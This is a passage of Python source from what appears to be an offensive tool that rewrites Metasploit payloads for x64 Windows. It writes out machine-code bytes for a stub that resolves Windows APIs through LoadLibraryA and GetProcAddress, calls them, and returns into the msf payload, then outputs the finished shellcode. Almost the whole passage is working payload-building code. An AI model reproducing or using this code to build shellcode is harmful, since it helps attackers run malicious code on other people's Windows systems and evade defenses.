                self.stub += b"\x4D\x31\xC0"                     # xor r8, r8
                
            else:
                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                sys.exit(-1)
            
            self.stub += b"\x48\x83\xEC\x20"                         # sub rsp, 0x20
            self.stub += b"\x48\x89\xE5"                             # mov rbp, rsp           # ;save stack
            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
            self.stub += b"\x41\xFF\x16"                             # CALL QWORD PTR DS:[r14]        ; Call KERNEL32.LoadLibraryA (DLL)
            self.stub += b"\x48\x89\xEC"                             # mov rsp, rbp              # restore stack
            
            # Get API and Call GPA
            self.stub += b"\x48\x89\xC2"                             # MOV RDX,RAX                    ; Save DLL Handle to EDX
            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                self.stub += b"\x31\xC0"                    # XOR EAX,EAX                    ; Prep EAX for use
                # this push on x64?? Look at it on x86 (might not be important)

                self.stub += b"\x50"                            # push EAX
            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'].lower() == 'kernelbase.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
            else:
                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                sys.exit(-1)
            
            self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
            self.stub += struct.pack("<I", updated_offset + 4)  
            self.stub += b"\x8A\xC5"                                # MOV AL,CH                      ; mov API offset to ECX
            self.stub += b"\x48\x89\xF1"                            # MOV RCX,RSI                    ; mov offset to ecx
            self.stub += b"\x48\x01\xC1"                            # ADD ECX,EAX                    ; find API location
            self.stub += b"\x48\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
            self.stub += b"\x48\x87\xD1"                            # xchg rcx, rdx                  ; Use the proper registers for gpa
            
            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
            self.stub += b"\x48\x89\xE5"                            # mov rbp, rsp           # ;save stack
            self.stub += b"\x48\x83\xE4\xF0"                        # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
            self.stub += b"\x41\xFF\x17"                            # CALL QWORD PTR DS:[r15]        ; Call Getprocaddress(DLL.handle, API)
            self.stub += b"\x48\x89\xEC"                            # mov rsp, rbp              # restore stack
            
            # Call API RAX has API
            self.stub += b"\x48\x83\xC4\x40"                        # SUB RSP, 40 ; align stack
            
            self.stub += b"\x41\x5f"                                # pop    r15
            self.stub += b"\x41\x5e"                                # pop    r14
            self.stub += b"\x41\x5d"                                # pop    r13
            self.stub += b"\x41\x5c"                                # pop    r12
            self.stub += b"\x41\x59"                                # pop    r9
            self.stub += b"\x41\x58"                                # pop    r8
            self.stub += b"\x5e"                                    # pop    rsi
            self.stub += b"\x5b"                                    # pop    rbx
            self.stub += b"\x5f"                                    # pop    rdi
            self.stub += b"\x59"                                    # pop    rcx
            self.stub += b"\x5a"                                    # pop    rdx
            self.stub += b"\x5D"                                    # pop    rbp (save return addr)
            self.stub += b"\x48\x83\xE4\xF0"                        # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
            self.stub += b"\xFF\xD0"                                # CALL RAX                       ; call target API
            # Recover
            
            self.stub += b"\x55"                                    # push rbp                       ; push return addr into msf caller
            self.stub += b"\x48\x8D\x2D\x00\x00\x00\x00"            # lea rbp, [rip]                   ; get pc
            self.stub += b"\x48\x81\xED"                            # SUB RBP,XX                     ; To reset the location of the api call back
            self.stub += struct.pack("<I", len(self.selected_payload) + len(self.stub) - 3)   
            self.stub += b"\xC3"                                    # RETN                           ; return back into msf payload logic


            self.jump_stub = b"\xe8"
            self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
        

        #look for ebp_offset_update here
        self.fix_up_hardcoded_offsets()

        self.entire_payload = self.jump_stub + self.selected_payload + self.stub + self.prestine_code

        sys.stderr.write("[*] Payload complete\n")
        sys.stderr.write("[*] Output size: {0}\n".format(len(self.entire_payload)))

        if self.OUTPUT is 'stdout':
            sys.stdout.buffer.write(self.entire_payload)
        else:
            self.print_formats()
        
        
        
if __name__ == '__main__':
    test = x86_windows_metasploit(**vars(args))
    test.get_it_in_order()
    test.doit()


